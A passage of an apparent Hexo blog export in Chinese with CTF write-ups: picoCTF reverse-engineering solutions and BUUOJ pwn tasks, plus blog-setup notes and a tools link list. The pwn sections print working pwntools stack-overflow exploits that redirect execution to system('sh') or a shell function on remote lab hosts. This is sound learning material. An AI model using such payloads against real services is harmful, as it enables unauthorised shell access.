rsp,10h给局部变量(形参?)分配空间(10h应该是16字节给两个变量,一个int argc和一个char *argv[]的数组—数组形参实际上是一个指针,所以也是8字节)</p><p>然后接下来的两个mov就能看出来x86_64的传参了,第一个是edi,第二个是rsi,逐个从寄存器中复制到内存</p><p>然后eax置0</p><p>此时该调用函数了,因为vulnerable_function没有形参,所以没有对edi这些寄存器进行处理,直接调用</p><h4 id="vulnerable-function-汇编分析">vulnerable_function()汇编分析</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803123501210.png" alt="image-20230803123501210"></p><p>同样在开头push rbp;mov rbp,rsp创建函数栈帧</p><p>接下来是对rsp进行add,但是这里我不理解为什么是add而不是sub(),总之就是对buf数组进行处理分配</p><p>下一行就是为_system函数的调用做准备,处理实参:</p><p>​mov     edi, offset command ; &quot;echo Input:&quot;中,offset表示获取一个标号,command标号代表的内存中存有这个字符串,将其赋值给edi用于_system的第一个参数(只有这一个参数)</p><p>然后调用_system()</p><p>返回来后,继续为_read()的调用做准备:</p><p>​先放上来_read()的描述(注意参数的位置):</p><p>​<strong>其实这个函数就是unistd.h(UNIX std)中声明的read()函数,用于文件读写</strong></p><p>​第一个参数是文件描述符(0代表标准输入stdin,1代表标准输出stdout,2表示标准错误输出stderr)</p><p>​第二个参数是输入的目标缓冲区</p><p>​第三个参数是指定要读取的最大字节数</p><p>​<code>ssize_t read(int fd, void *buf, size_t nbytes)</code></p><p>​lea指令全称是 “Load Effective Address”，意为加载有效地址,就是将指定的内存地址计算出来并存放在目标寄存器中.这里这条指令将 <code>rbp+buf</code> 地址的计算结果保存在 <code>rax</code> 中,准备赋值给rsi</p><p>​将200h赋值给edx作为第3个参数(nbytes)</p><p>​将刚刚计算出来的eax赋值给rsi作为第二个参数(buf)</p><p>​将0h赋值给edi作为第一个参数(fd)</p><p>然后调用_read(),这道题的切入点就是这里</p><p>后面的部分没看…留作以后…</p><p>结束…</p><h2 id="ciscn-2019-ne-5">ciscn_2019_ne_5</h2><p>这道题就是绕了一下,利用strcat()进行了栈溢出,同时不同的步骤需要从不同的函数进行处理利用,要进行顺序分析</p><p>分析如下:</p><p>代码首先需要输入正确的密码,然后下面是一个switch的循环(注意反编译显示循环使用一个跳转函数实现)</p><p>Addlog中允许输入0x80(128)长度的src</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200612721.png" alt="image-20230805200612721" style="zoom:50%;" /></p><p>print中有_system()函数可以利用</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200628207.png" alt="image-20230805200628207" style="zoom:45%;" /></p><p>getflag中有strcpy,同时局部变量(反编译问题)共有0x48,0x80&gt;0x48,满足溢出</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200700665.png" alt="image-20230805200700665" style="zoom:50%;" /></p><p>ROPgadget工具查找’sh’字符串的地址(此题没有/bin/sh)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200722034.png" alt="image-20230805200722034" style="zoom: 40%;" /></p><p>先走1选项,输入足够长的字符串准备溢出,然后走4选项进行strcpy溢出,跳转至system()即可</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27895</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x080484D0</span></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x48</span> + <span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;info:&#x27;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200041706.png" alt="image-20230805200041706" style="zoom:33%;" /><p>这题看了半天需要填充多少字节,唉,看错了</p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> x64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第一周</title>
      <link href="/2023d96bc12e05b6/"/>
      <url>/2023d96bc12e05b6/</url>
      
        <content type="html"><![CDATA[<p>以前除了新生赛再没写过WP,还是多写这东西好(博客搭建还没搞好QWQ)</p><h1 id="re">RE:</h1><p>所有题来自picoCTF2022,题目很简单,适用于萌新蒟蒻(比如我)入门快速适应re和pwn等题目的模式和解题一般顺序</p><h2 id="file-run1">file-run1:</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-111.png" alt="img"></p><p>是的,我们需要一个命令行(显然可以知道是个bash…),丢进去跑就行了…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-112.png" alt="img"></p><p>菜鸟’s writeup结束…</p><p>或者有椰叶丢进IDA里瞧瞧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-113.png" alt="img"></p><p>去找flag吧…(好像是ctrl+鼠标左键?..)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-114.png" alt="img"></p><p>结束了…</p><h2 id="file-run2">file-run2:</h2><p>丢个Hello!的参数跑就完事了(我太菜了)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-115.png" alt="img"></p><p>中间还打错个字母…</p><h2 id="gdb-test-drive">GDB Test Drive:</h2><p>emm…这玩意就是看看你gdb装没装…虽然但是,我还得学学gdb(毕竟CLion/VS的可视化用惯了…)</p><p>(此处gdbme默认有x权限,所以没用chmod)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-116.png" alt="img"></p><p>一条一条运行调试的子命令就行(回头再学吧…gdb不是太会用)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-117.png" alt="img"></p><p>结束…</p><h2 id="patchme-py"><a href="http://patchme.py">patchme.py</a>:</h2><p>咱就是问,还有什么比源码更香的东西吗?..直接分析源码…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-118.png" alt="img"></p><p>python这东西就在windows下跑吧,毕竟库都装在windows下(虽然不知道为啥控制台识别不到库…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-119.png" alt="img"></p><p>直接看源码,发现就是个字符串比较(暂时不想管那个加密的事…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-120.png" alt="img"></p><p>有一说一,我才懒得构造那个密码,我直接全删了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-121.png" alt="img"></p><p>保存了再跑就完事了…(源码在手还怕啥)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-122.png" alt="img"></p><p>至于解密方法能看懂在干啥,但是密码基础一点没有,反正先能跑出来再说,坐等椰叶们讲解(doge)</p><h2 id="safe-opener">Safe Opener:</h2><p>.java也是源码…</p><p>SublimeText4 yyds!!!我直接看源码(nnd我不会java怎么办…好在c++基础还可以…)</p><p>吐槽:java获取个输入这么费劲?还得手动创建输入流对象?</p><p>相信椰叶们都能看懂代码…密钥就是这一坨:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-123.png" alt="img"></p><p>而且一看就知道是base64</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-124.png" alt="img"></p><p>《最好用的Base64在线工具》…怕不是不知道CyberChef的大名…</p><p>结束…</p><h2 id="unpackme-py"><a href="http://unpackme.py">unpackme.py</a>:</h2><p>经典的加密解密库(但是我不会)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-125.png" alt="img"></p><p>第12行发现要对解码后的东西进行运行…所以知道加密的是一段代码,所以把exec换成print逝逝:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-126.png" alt="img"></p><p>这里有点奇葩,命令行找不到我的库…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-127.png" alt="img"></p><p>还是打开pycharm吧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-128.png" alt="img"></p><p>好吧直接结束…</p><h2 id="bloat-py"><a href="http://bloat.py">bloat.py</a>:</h2><p>这个程序的函数名和变量名一看就是故意的…加点注释一点点分析看看:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-129.png" alt="img"></p><p>可以看到函数arg133()中有一个比较,并且对比成功了会有一个输出,我们直接将那个字符串单独打印看看(先把其他代码注释掉):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-130.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-131.png" alt="img"></p><p>也就是说我们输入的arg432变量的值就是这个,所以将代码恢复原样重新以这个输入值运行一遍:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-132.png" alt="img"></p><p>解密成功!</p><p>注: .enc文件为常见的加密后的文件格式,常常出现在勒索病毒运行后的结果,或对文件进行加密的情况,这里的代码即对其进行特定方式的解密</p><h2 id="fresh-java">Fresh Java:</h2><p>这道题也不难,逆向一下class文件,然后写个解密脚本就行</p><h3 id="第一步-java逆向">第一步-java逆向:</h3><p>某椰叶提供的在线逆向网站:<a href="http://javare.cn">http://javare.cn</a>(注意文本是白色的…我以为出问题了)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-133.png" alt="img"></p><p>复制到一个java文件,观察发现(虽然我不会java,但是好在会其他语言…)对比的是一个字符串的每一个字符(ASCII码)</p><p>于是,我们可以使用正则表达式…把那一堆ASCII码提取出来(这里在sublimetext4里使用查找替换的正则模式):</p><h3 id="第二步-正则部分">第二步-正则部分:</h3><h4 id="第一步">第一步:</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-134.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-135.png" alt="img"></p><h4 id="第二步">第二步:</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-136.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-137.png" alt="img"></p><p>直接复制出来</p><h3 id="第三步-解密脚本">第三步-解密脚本:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-138.png" alt="img"></p><p>这是我们处理后的ASCII码(放在in.txt里)↑</p><p>然后写脚本转换为字符串(注意最开头的34被删了,因为它是字符串的长度),这里我使用c++:</p><p>之所以不使用我最擅长的c是因为c++的STL算法库有reverse函数</p><p>暂时无法在飞书文档外展示此内容</p><p>运行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-139.png" alt="img"></p><p>结束…</p><h2 id="bbbbloat">Bbbbloat:</h2><p>直接拖IDA里看main:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-140.png" alt="img"></p><p>直接输549255就行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-141.png" alt="img"></p><p>结束…</p><h2 id="unpackme">Unpackme:</h2><p>这里提示upx脱壳</p><p>首先扔进DIE里看看,发现有UPX加壳(注意是ELF64—Linux):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-142.png" alt="img"></p><p>所以我们去下载UPX进行脱壳(就是第一个):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-143.png" alt="img"></p><p>免安装,解压后即可使用(xz先解压然后tar解包):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-144.png" alt="img"></p><p>脱壳后再检测发现已经没有壳了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-145.png" alt="img"></p><p>丢进IDA即可(代码一看就懂—第17行):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-146.png" alt="img"></p><p>运行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-147.png" alt="img"></p><p>结束…</p><h2 id="keygenme">Keygenme:</h2><p>我懂那个意思…运行到字符串比较,然后直接看v14变量就行</p><p>但是我的IDA各种问题无法调试…正在重装…</p><p>装好了…IDA远程调试看看这篇文章:</p><p><a href="https://blog.csdn.net/abc_670/article/details/80066817">远程调试</a></p><p>好现在上题:</p><p>至于IDA里打开就不说了,直接找到main函数里if语句调用的函数,如果发现是类似&amp;func+1这样的就F5重新反编译一下一般就可以了:</p><p>经过分析发现flag存在v17[[32-67]那么直接在v17处理后打断点调试就行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-148.png" alt="img"></p><p>找到v17,观察(整理)出flag即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-149.png" alt="img"></p><p>picoCTF{br1ng_y0ur_0wn_k3y_9d74d90d}</p><p>结束…</p><h2 id="wizardlike">Wizardlike:</h2><p>运行一遍一看就是个纯地图</p><p>然后很多地方发现过不去—这不就穿墙挂么~~~</p><p>所以我们IDA吧…别问我怎么找到那个函数的…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-150.png" alt="img"></p><p>没错就是这里↑</p><p>看来是判断是否越界的函数了…(类似我以前写的贪吃蛇的is_over_lap()和againstTheWall()函数):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-151.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-152.png" alt="img"></p><p>好了帮助理解结束了,现在直接把返回的0LL全改成非0就行(之所以没说改成1LL是因为我把小端和大端搞反了—我是菜逼):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-153.png" alt="img"></p><p>然后保存就行,接下来直接跑代码观察地图就行,发现地图的形状就是flag~~</p><p>跑吧~~</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-154.png" alt="img"></p><p>地图贼反人类…慢慢看吧…</p><p>picoCTF{ur_4_w1z4rd_4844AD6F}</p><p>好像每个人的地图还不一样…</p><p>结束…</p><h1 id="pwn">PWN:</h1><h2 id="test-your-nc">test_your_nc:</h2><p>很简单,运行就知道是获取到shell了</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-155.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-156.png" alt="img"></p><p>但是作为PWN手我们要用正确的解题方式</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-157.png" alt="img"></p><p>丢IDA里F5大法,不用解释</p><p>结束…</p><h2 id="rip">Rip:</h2><h3 id="总体分析">总体分析:</h3><p>先运行,发现有输入(盲猜gets()),丢IDA吧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-158.png" alt="img"></p><p>好,盲猜正确…接下来该面向google解题了…</p><p>看看有没有其他可利用的函数—&gt;找到了fun():</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-159.png" alt="img"></p><p>于是我们就要想办法跳转到这个函数,从而获得shell入口</p><h3 id="如何构造字符串">如何构造字符串:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-160.png" alt="img"></p><p>可以发现s变量占15字节(反编译也能看出来char s[15])</p><p>现在问题来了,我们要知道栈溢出的细节:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-161.png" alt="img"></p><p>用DIE工具查看该文件,发现是ELF64(废话),那么针对ELF64的分析如下:</p><p><a href="https://blog.csdn.net/weixin_43780092/article/details/126694251">基础知识可以看看这篇文章</a></p><p>因为本蒟蒻只会一点8086,所以也就大致先看看,有个概念再说…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-162.png" alt="img"></p><p>其实重点就是这张图↑</p><h3 id="对栈帧的分析-也就是分析上图">对栈帧的分析(也就是分析上图):</h3><p>首先要知道对于函数栈帧来讲,也就是对于堆栈而言,是从高地址向低地址分配的(所以对s的溢出会影响到上一个函数栈帧—我理解的应该没错)</p><p>那么我们要进行计算,首先是15字节的s数组,以任意值进行填充,然后是填充当前函数帧的ebp(对于ELF64而言,且其占用8字节—因为是64位机器),此时我们就有15+8==23字节了</p><p>接下来就是我们实际要覆盖的返回地址了,这里在IDA找到fun()函数的地址(0x401186)</p><p>于是我们在python中写exp(我的环境在linux安装,所以在linux下编写)—我也不知道我啥时候装的环境</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-163.png" alt="img"></p><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29939</span>) <span class="comment">#靶机地址和端口</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">15</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>).decode(<span class="string">&quot;iso-8859-1&quot;</span>)</span><br><span class="line"><span class="comment">#char s的15个字节+RBP的8字节+fun函数入口地址，+1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-164.png" alt="img"></p><h3 id="问题来了">问题来了:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-165.png" alt="img"></p><p>是的没错,玄学,这个问题先放在这里吧,暂时搞不了…(哪天回头再看看吧,有地方没理解到位)</p><p>而且那个堆栈平衡以后也得仔细看看…</p><p>​      勉强算是结束了吧…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客文档建立日志</title>
      <link href="/202354d71795c077/"/>
      <url>/202354d71795c077/</url>
      
        <content type="html"><![CDATA[<h2 id="markdown文件-yaml-front-matter-快捷信息备份">markdown文件 YAML Front Matter 快捷信息备份</h2><p>2023.07.27</p><table><thead><tr><th style="text-align:left">写法</th><th>解释</th></tr></thead><tbody><tr><td style="text-align:left">title</td><td>【必需】文章标题</td></tr><tr><td style="text-align:left">date</td><td>【必需】文章创建日期(实际博客网页会自动同步,可以不加)</td></tr><tr><td style="text-align:left">updated</td><td>【可选】文章更新日期</td></tr><tr><td style="text-align:left">tags</td><td>【可选】文章标签</td></tr><tr><td style="text-align:left">categories</td><td>【可选】文章分类</td></tr><tr><td style="text-align:left">keywords</td><td>【可选】文章关键字</td></tr><tr><td style="text-align:left">description</td><td>【可选】文章描述</td></tr></tbody></table><h1 id="none"></h1><h2 id="图床搭建">图床搭建</h2><p>2023.07.27</p><p>使用PicGo+阿里云OSS搭建:</p><p>typora测试PicGo app失败,但是后续测试发现成功</p><h3 id="关键报错问题">关键报错问题:</h3><p>​从飞书复制下来的markdown中的图片会上传失败,报错信息:</p><p>​No mime type found for file asynccode</p><p>​解决方案:</p><p>​暂未有直接的解决办法</p><p>​间接解决办法:</p><p>​将typora图片设置为自动保存到某个路径,从而自动生成图片路径为本地的一篇markdown,然后重新改回上传图片,将本地图片全部上传即可解决当前篇博客的图片问题.但是意味着不能每次从飞书这样操作,否则会非常麻烦.</p><h2 id="评论系统配置">评论系统配置</h2><p><s>2023.07.28</s></p><p><s>基于Twikoo评论系统,使用zeabur部署:</s></p><p><s>1.将github上Twikoo的仓库fork到自己的github中</s></p><p><s>2.配置zeabur服务</s></p><p><s>3.在Hexo框架中(butterfly主题支持该评论系统)对zeabur生成的域名进行连接</s></p><p><s>4.成功,部署到网站</s></p><p><s>2023.08.04</s></p><p><s>1.配置新评论邮箱提醒</s></p><p><s>2.配置Navicat16连接到评论数据库(MongoDB),可以进行评论的后台管理</s></p><p>zeabur使用免费计划,已被删库…</p><br><p>2023.11.6</p><p>基于Twikoo评论系统,换为Netlify部署.</p><p>按照文档搭建即可</p><h2 id="搜索功能">搜索功能</h2><p>添加本地搜索插件—hexo-generator-search</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装插件:</span></span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局_config.yml中添加:</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 主题_config.yml中设置:</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#注:template配置，无需配置该项,配置了反而无法正常搜索</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类导航</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<p>hello world</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的影子</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>WAHAHA&#39;s C语言教程</title>
      <link href="/C_tutorial/index.html"/>
      <url>/C_tutorial/index.html</url>
      
        <content type="html"><![CDATA[<p>Hello World!</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/json-data/tools.json"/>
      <url>/json-data/tools.json</url>
      
        <content type="html"><![CDATA[[{"class_name":"CTF工具","class_desc":"常用在线工具","link_list":[{"name":"CyberChef","link":"https://icyberchef.com/","avatar":"/img/artical_pic.png","descr":"编码万能转换"},{"name":"密码破解","link":"http://www.atoolbox.net/Category.php?Id=27&Page=1","avatar":"/img/artical_pic.png","descr":"基本密码在线解密"},{"name":"正则表达式工具","link":"https://c.runoob.com/front-end/854/?optionGlobl=global","avatar":"/img/artical_pic.png","descr":"正则表达式在线处理"},{"name":"BrainF**k and Ook","link":"https://www.splitbrain.org/services/ook","avatar":"/img/artical_pic.png","descr":"某种玄学的东西"},{"name":"因数分解","link":"http://www.factordb.com/index.php","avatar":"/img/artical_pic.png","descr":"一个因数分解数据库"},{"name":"摩斯电码","link":"https://morsecode.world/international/decoder/audio-decoder-adaptive.html","avatar":"/img/artical_pic.png","descr":"不解释"},{"name":"图像处理","link":"https://onlinetools.com/image","avatar":"/img/artical_pic.png","descr":"图像的各种特殊处理"},{"name":"Java在线逆向","link":"http://javare.cn","avatar":"/img/artical_pic.png","descr":"可以class文件..."},{"name":"Awesome-Hacking","link":"https://blog.csdn.net/ZYC88888/article/details/113663486","avatar":"/img/artical_pic.png","descr":"CTF工具库"}]},{"class_name":"转换工具","class_desc":"格式转换的一些小工具","link_list":[{"name":"pdf转换工具","link":"https://www.alltoall.net/","avatar":"/img/artical_pic.png","descr":"文档在线转换"},{"name":"音频格式转换工具","link":"http://ncm.miidj.com/","avatar":"/img/artical_pic.png","descr":"方便使用播放器"},{"name":"操作系统文件格式转换","link":"http://tools.bugscaner.com/text/textconvert.html","avatar":"/img/artical_pic.png","descr":"在线文档格式windows unix macintosh互相转换"}]},{"class_name":"网络工具","class_desc":"网络相关的工具和资源","link_list":[{"name":"测速网","link":"https://www.speedtest.cn/","avatar":"/img/artical_pic.png","descr":"网速测试"},{"name":"Clash","link":"https://github.com/Dreamacro/clash/releases","avatar":"/img/artical_pic.png","descr":"Clash下载直达"},{"name":"虚拟手机号","link":"https://sms-activate.org/cn/getNumber","avatar":"/img/artical_pic.png","descr":"虚拟手机号服务"},{"name":"机场","link":"https://www.mojie.mx/#/login","avatar":"/img/artical_pic.png","descr":"懂?"}]},{"class_name":"其他工具","class_desc":"其他各种工具","link_list":[{"name":"文本对比工具","link":"https://tool.p2hp.com/tool-online-difftext/","avatar":"/img/artical_pic.png","descr":"在线文本对比"},{"name":"大数运算器","link":"https://goodcalculators.com/big-number-calculator/","avatar":"/img/artical_pic.png","descr":"高精度大数在线运算"},{"name":"阶乘运算器","link":"https://zh.numberempire.com/factorialcalculator.php","avatar":"/img/artical_pic.png","descr":"阶乘计算"}]},{"class_name":"创作与AI工具","class_desc":"AI,文档,表格,图像等创作工具","link_list":[{"name":"ChatGPT","link":"https://chat.openai.com/","avatar":"/img/ChatGPT.webp","descr":"学习的好帮手"},{"name":"在线作图工具","link":"https://www.processon.com/","avatar":"/img/artical_pic.png","descr":"免费在线流程图思维导图"}]},{"class_name":"技术文档","class_desc":"各种语言,框架,工具的文档","link_list":[{"name":"C/C++参考手册","link":"https://zh.cppreference.com/mwiki/index.php?title=%E9%A6%96%E9%A1%B5&variant=zh-cn","avatar":"/img/Logo/C_and_CPP.jpg","descr":"C和C++语言的在线参考手册"},{"name":"GTK文档","link":"https://www.gtk.org/docs/installations/windows/","avatar":"/img/Logo/logo-gtk-sm.png","descr":"GTK库的文档"},{"name":"Windows API 索引","link":"https://learn.microsoft.com/zh-cn/windows/win32/apiindex/windows-api-list","avatar":"/img/Logo/Microsoft.png","descr":"Windows API 的文档"}]}]]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<p>hello world</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.baidu.com">https://www.baidu.com</a></p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>在线工具</title>
      <link href="/tools/index.html"/>
      <url>/tools/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
